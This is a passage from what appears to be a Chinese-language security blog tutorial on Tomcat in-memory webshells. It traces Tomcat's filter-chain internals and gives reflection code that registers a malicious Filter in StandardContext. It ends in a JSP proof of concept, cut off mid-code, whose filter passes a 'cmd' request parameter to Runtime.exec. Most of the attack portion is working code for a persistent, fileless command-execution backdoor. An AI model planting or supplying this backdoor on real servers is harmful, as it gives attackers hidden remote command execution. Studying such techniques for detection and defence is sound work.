punctuation">;</span>            ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.servlet"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ApplicationDispatcher<span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>                lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>                lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>Filter的流程相对Listener来说更麻烦，StandardContext并没有类似addFilter的方法，上面我们也提到了Filter是链式调用，所以接受的是一个FilterMap，还需要利用FilterMap把我们的恶意类包装起来。</p><p>‍</p><p>首先找到filters属性的定义看他的类型：</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303095319-e0o5wdy.png" alt="image">​</p><p>需要一个<code>ApplicationFilterConfig类</code>​，往上一步看是如何创建<code>ApplicationFilterConfig类的</code>​</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303100009-s0l5xmk.png" alt="image">​</p><p><code>ApplicationFilterFactory</code>​的<code>createFilterChain</code>​方法创建了<code>ApplicationFilterChain</code>​类，跟进<code>createFilterChain</code>​看一下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> ApplicationFilterChain <span class="token function">createFilterChain</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span>            Wrapper wrapper<span class="token punctuation">,</span> Servlet servlet<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// If there is no servlet to execute, return null</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>servlet \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Create and initialize a filter chain object</span>        ApplicationFilterChain filterChain \<span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Request req \<span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> request<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>IS\_SECURITY\_ENABLED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Security: Do not recycle</span>                filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                filterChain \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterChain<span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>filterChain \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    req<span class="token punctuation">.</span><span class="token function">setFilterChain</span><span class="token punctuation">(</span>filterChain<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Request dispatcher in use</span>            filterChain \<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        filterChain<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span>servlet<span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">setServletSupportsAsync</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Acquire the filter mappings for this Context</span>        StandardContext context \<span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> \<span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// If there are no filter mappings, we are done</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>filterMaps \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>filterMaps<span class="token punctuation">.</span>length \<span class="token operator">=</span>\<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> filterChain<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Acquire the information we will need to match filter mappings</span>        DispatcherType dispatcher \<span class="token operator">=</span>                <span class="token punctuation">(</span>DispatcherType<span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>DISPATCHER\_TYPE\_ATTR<span class="token punctuation">)</span><span class="token punctuation">;</span>        String requestPath \<span class="token operator">=</span> null<span class="token punctuation">;</span>        Object attribute \<span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>DISPATCHER\_REQUEST\_PATH\_ATTR<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>attribute <span class="token operator">!</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            requestPath \<span class="token operator">=</span> attribute<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String servletName \<span class="token operator">=</span> wrapper<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Add the relevant path-mapped filters to this filter chain</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>FilterMap filterMap <span class="token operator">:</span> filterMaps<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchDispatcher</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> dispatcher<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchFiltersURL</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> requestPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            ApplicationFilterConfig filterConfig \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>                    context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfig \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// FIXME - log configuration problem</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Add filters that match on servlet name second</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>FilterMap filterMap <span class="token operator">:</span> filterMaps<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchDispatcher</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> dispatcher<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchFiltersServlet</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> servletName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            ApplicationFilterConfig filterConfig \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>                    context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfig \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// FIXME - log configuration problem</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Return the completed filter chain</span>        <span class="token keyword">return</span> filterChain<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>简化一下逻辑就是这样：</p><pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>filterChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>创建一个ApplictionFilterChain对象<span class="token number">2</span><span class="token punctuation">.</span>StandardContext context <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>获取当前进程Context<span class="token number">3</span><span class="token punctuation">.</span>FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  通过Context获取所有过滤器<span class="token number">4</span><span class="token punctuation">.</span>ApplicationFilterConfig filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>获取filterConfig<span class="token number">5</span><span class="token punctuation">.</span>filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span> 添加过滤器</code></pre><p>一个小知识：一个<code>filterConfig</code>​对应一个filter，但是一个filter可以有多个<code>filterConfig</code>​</p><p>这里需要了解一下FilterMap和FilterConfig</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104134-sfasxfo.png" alt="image">​</p><p>filterMap主要存储的是urlPatterns和filterName这些信息</p><p>恰好对应配置的这些标签：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span></code></pre><p>filterConfig存储的是filterDef，filterDef下有filterClass和filterName这些信息</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104918-hnewqap.png" alt="image">​</p><p>filterDef这两项配置对应的恰好就说注册表里面的配置：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span></code></pre><p>因此构造恶意的Filter就需要注册这些信息才能使得Filter生效</p><pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>filterChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>创建一个ApplictionFilterChain对象<span class="token number">2</span><span class="token punctuation">.</span>StandardContext context <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>获取当前进程Context<span class="token number">3</span><span class="token punctuation">.</span>FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  通过Context获取所有过滤器<span class="token number">4</span><span class="token punctuation">.</span>ApplicationFilterConfig filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>获取filterConfig<span class="token number">5</span><span class="token punctuation">.</span>filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span> 添加过滤器</code></pre><h3 id="第一步-获取ServletContext"><a href="#第一步-获取ServletContext" class="headerlink" title="第一步 获取ServletContext"></a>第一步 获取ServletContext</h3><p>其实第一步是和上面原生的一样创建ApplicationFilterChain对象，但是创建ApplicationFilterChain对象需要反射获取他的Context。所以第一步还是需要从request获取StandardContext</p><pre class=" language-jsp"><code class="language-jsp">    Field requestField = request.getClass().getDeclaredField("request");    requestField.setAccessible(true);    Request requestImp = (Request) requestField.get(request);    StandardContext standardContext = (StandardContext)requestImp.getContext();</code></pre><p>还有另一种获取StandardContext的方式，Tomcat启动会为每个环境创建Session、Cookie等信息，都由StandardContext控制</p><p>所以可以利用<code>request.getSession().getServletContext()</code>​获取，但是<code>request.getSession().getServletContext()</code>​只是得到了ApplicationContext，还需要再反射一次才能获取StandardContext，比较麻烦，如下图所示</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303154255-5jyu8c0.png" alt="image">​</p><h3 id="第二步-设置FilterDef"><a href="#第二步-设置FilterDef" class="headerlink" title="第二步 设置FilterDef"></a>第二步 设置FilterDef</h3><pre class=" language-java"><code class="language-java">    FilterDef filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‍</p><h3 id="第三步-设置FilterMap"><a href="#第三步-设置FilterMap" class="headerlink" title="第三步 设置FilterMap"></a>第三步 设置FilterMap</h3><pre class=" language-java"><code class="language-java">    FilterMap filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span>DispatcherType<span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调度器类型设置为处理客户端请求</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterMap</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>DispatcherType</code>​ 是一个枚举类型，它定义了 Servlet 中的请求调度器类型。在这里<code>.REQUEST</code>​ 表示该过滤器将被调度处理来自客户端的请求</p><h3 id="第四步-包装FilterDef和FilterConfig"><a href="#第四步-包装FilterDef和FilterConfig" class="headerlink" title="第四步 包装FilterDef和FilterConfig"></a>第四步 包装FilterDef和FilterConfig</h3><pre class=" language-jsp"><code class="language-jsp">    Constructor<ApplicationFilterConfig> applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);    applicationFilterConfigConstructor.setAccessible(true);    ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");    filterConfigsField.setAccessible(true);    Map filterConfigs = (Map) filterConfigsField.get(standardContext);    filterConfigs.put("ServletFilter", applicationFilterConfig);</code></pre><p>这一步的关键代码看StandardContext的<code>filterStart</code>​方法的16，17，18三行：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">filterStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Starting filters"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Instantiate and record a FilterConfig for each defined filter</span>        <span class="token keyword">boolean</span> ok <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">)</span> <span class="token punctuation">{</span>            filterConfigs<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>FilterDef<span class="token operator">></span> entry <span class="token operator">:</span> filterDefs<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String name <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">" Starting filter '"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    ApplicationFilterConfig filterConfig <span class="token operator">=</span>                            <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    t <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>                            <span class="token string">"standardContext.filterStart"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    ok <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ok<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.servlet.annotation.WebFilter"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>            Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span> ServletResponse response<span class="token punctuation">,</span> FilterChain chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>            String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span 